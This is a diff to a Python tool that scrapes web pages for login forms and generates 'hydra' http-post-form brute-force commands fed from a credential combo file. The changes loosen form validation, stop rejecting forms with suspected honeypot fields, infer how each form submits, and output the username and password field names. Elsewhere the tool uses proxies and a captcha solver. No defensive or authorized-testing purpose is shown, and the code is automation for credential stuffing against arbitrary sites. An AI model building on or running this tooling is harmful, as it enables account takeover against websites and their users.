@@ -8,6 +8,7 @@ try:
 except ImportError:
     HAS_BS4 = False
 
+from config import config
 from fetch import HAS_SELENIUM, fetch_page_playwright, fetch_page_selenium, solve_captcha
 from helpers import normalize_and_validate_target, validate_url
 
@@ -41,17 +42,13 @@ def validate_login_form(form, html_content, strict=True):
 
     method = form.get("method", "get").lower()
     if method != "post":
-        if strict:
-            return False, "method is not POST", 0
         confidence += 20
         reasons.append("non-POST method")
 
     action = form.get("action", "").strip()
-    if action in ["#", "javascript:void(0)", "about:blank"]:
-        if strict:
-            return False, "invalid action URL", 0
+    if action in ["#", "javascript:void(0)", "about:blank", ""]:
         confidence += 10
-        reasons.append("suspicious action URL")
+        reasons.append("action is blank/hash/js")
 
     password_fields = form.find_all("input", {"type": "password"})
     if not password_fields:
@@ -61,15 +58,11 @@ def validate_login_form(form, html_content, strict=True):
 
     user_fields = form.find_all("input", {"type": ["text", "email"]})
     if not user_fields:
-        if strict:
-            return False, "no username/email field found", 20
         confidence += 10
         reasons.append("no obvious username field")
 
     visible_inputs = [i for i in form.find_all("input") if i.get("type") not in ["hidden", "submit"]]
     if len(visible_inputs) < 2:
-        if strict:
-            return False, "too few visible input fields", 10
         confidence += 5
         reasons.append("few visible inputs")
 
@@ -78,8 +71,6 @@ def validate_login_form(form, html_content, strict=True):
         name = (inp.get("name") or "").lower()
         style = (inp.get("style") or "").lower()
         if any(kw in name for kw in honeypot_keywords) and ("display:none" in style or "visibility:hidden" in style):
-            if strict:
-                return False, "possible honeypot field detected", 0
             confidence -= 20
             reasons.append("honeypot suspicion")
 
@@ -93,7 +84,7 @@ def validate_login_form(form, html_content, strict=True):
     if confidence < 60 and strict:
         return False, f"low confidence ({confidence}): {', '.join(reasons)}", confidence
 
-    return True, f"valid (confidence: {confidence})", confidence
+    return True, f"valid (confidence: {confidence}; reasons: {', '.join(reasons) or 'n/a'})", confidence
 
 
 def normalize_form_action(page_url, action):
@@ -102,15 +93,33 @@ def normalize_form_action(page_url, action):
         return None
 
     raw_action = (action or "").strip()
-    candidate = base_url if not raw_action else urljoin(base_url, raw_action)
+    candidate = base_url if not raw_action or raw_action == "#" else urljoin(base_url, raw_action)
     return validate_url(candidate)
+
+
+def infer_submit_mode(form, page_url, action_url):
+    method = (form.get("method") or "unknown").lower()
+    raw_action = (form.get("action") or "").strip().lower()
+    js_indicators = [
+        bool(form.get("onsubmit")),
+        "addEventListener('submit'" in str(form),
+        "preventdefault" in str(form).lower(),
+        "ajax" in str(form).lower(),
+    ]
+    if method == "post" and action_url:
+        return "native_post"
+    if method == "get" and action_url:
+        return "native_get"
+    if raw_action in {"", "#", "javascript:void(0)"} and any(js_indicators):
+        return "js_handled"
+    return "unknown"
 
 
 def extract_login_form(url, proxy=None, strict_validation=True):
     if not HAS_BS4:
         return None, "bs4_not_installed"
 
-    url, invalid_reason = normalize_and_validate_target(url)
+    url, invalid_reason = normalize_and_validate_target(url, allow_nonstandard_ports=bool(config.get("allow_nonstandard_ports", False)))
     if not url:
         return None, {"status": "skipped_invalid_target", "reason": invalid_reason or "invalid target"}
 
@@ -125,11 +134,12 @@ def extract_login_form(url, proxy=None, strict_validation=True):
         if isinstance(error, dict):
             return None, {
                 "status": "fetch_failed",
-                "error_code": error.get("code") or "UNKNOWN_FETCH_ERROR",
-                "error_message": error.get("message") or "fetch failed",
-                "hint": error.get("hint") or "network or browser error",
+                "error_code": error.get("code") or "fetch_failed",
+                "error_hint": error.get("hint") or "Navigation failed",
+                "error_detail": error.get("detail") or "fetch failed",
+                "error_stacktrace": error.get("stacktrace"),
             }
-        return None, {"status": "fetch_failed", "error_code": "UNKNOWN_FETCH_ERROR", "error_message": str(error or "no_html")}
+        return None, {"status": "fetch_failed", "error_code": "fetch_failed", "error_hint": "Navigation failed", "error_detail": str(error or "no_html")}
 
     soup = BeautifulSoup(html, "html.parser")
 
@@ -147,9 +157,7 @@ def extract_login_form(url, proxy=None, strict_validation=True):
 
     for form in forms:
         is_valid, reason, confidence = validate_login_form(form, html, strict=strict_validation)
-
         if not is_valid:
-            print(f"Skipped form at {url}: {reason}")
             continue
 
         if confidence > best_confidence:
@@ -160,15 +168,12 @@ def extract_login_form(url, proxy=None, strict_validation=True):
     if not best_form:
         return None, {"status": "no_form", "reason": f"no valid form (best confidence: {best_confidence})"}
 
-    action = normalize_form_action(url, best_form.get("action"))
-    if not action:
-        return None, {"status": "no_form", "reason": "invalid action"}
-
-    if best_form.get("method", "post").lower() != "post":
-        return None, {"status": "no_form", "reason": "non-post form selected"}
+    action = normalize_form_action(url, best_form.get("action")) or url
+    method = (best_form.get("method") or "unknown").lower()
 
     post_parts = []
     username_field = None
+    password_field = None
 
     for inp in best_form.find_all("input"):
         name = inp.get("name")
@@ -177,6 +182,7 @@ def extract_login_form(url, proxy=None, strict_validation=True):
         typ = inp.get("type", "text").lower()
 
         if typ == "password":
+            password_field = name
             post_parts.append(f"{name}=^PASS^")
         elif typ in ["text", "email"] and not username_field:
             username_field = name
@@ -190,30 +196,31 @@ def extract_login_form(url, proxy=None, strict_validation=True):
         if n:
             post_parts.append(f"{n}={v}")
 
-    sub = best_form.find("input", {"type": "submit"})
-    if sub:
-        n = sub.get("name")
-        v = sub.get("value", "Login")
-        if n:
-            post_parts.append(f"{n}={v}")
-
-    if not username_field:
-        username_field = "username" if "user" in str(best_form).lower() else "email"
-        post_parts.append(f"{username_field}=^USER^")
-
-    post_data = "&".join(post_parts)
+    submit_mode = infer_submit_mode(best_form, url, action)
     failure = detect_failure_string(soup, url)
+    post_data = "&".join(post_parts)
 
-    target = urlparse(url).netloc or url
-    cmd_template = f'hydra -L "{{combo_file}}" -P "{{combo_file}}" {target} http-post-form "{action}:{post_data}:{failure}" -V -t 4 -f'
+    status = "success_form" if submit_mode == "native_post" and username_field and password_field else "success_loginish"
+
+    hydra_template = ""
+    if status == "success_form":
+        target = urlparse(url).netloc or url
+        hydra_template = f'hydra -L "{{combo_file}}" -P "{{combo_file}}" {target} http-post-form "{action}:{post_data}:{failure}" -V -t 4 -f'
 
     return {
+        "status": status,
         "original_url": url,
         "action": action,
         "post_data": post_data,
         "failure_condition": failure,
-        "hydra_command_template": cmd_template,
+        "hydra_command_template": hydra_template,
         "confidence": best_confidence,
         "validation_reason": best_reason,
         "fallback_used": fallback_used,
+        "method": method,
+        "action_url": action,
+        "user_field": username_field,
+        "pass_field": password_field,
+        "submit_mode": submit_mode,
+        "reasons": best_reason,
     }, None
